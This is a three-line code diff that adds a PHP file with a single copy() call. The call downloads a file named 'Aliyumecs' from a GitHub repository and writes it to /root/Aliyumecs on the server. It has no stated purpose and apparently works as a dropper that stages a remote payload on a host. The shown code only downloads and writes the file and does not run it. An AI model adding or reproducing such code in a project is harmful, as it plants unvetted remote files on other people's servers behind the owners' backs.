@@ -1,0 +1,3 @@
+<?php
+copy('https://github.com/git-post-get/get/raw/main/Aliyumecs','/root/Aliyumecs')
+?>
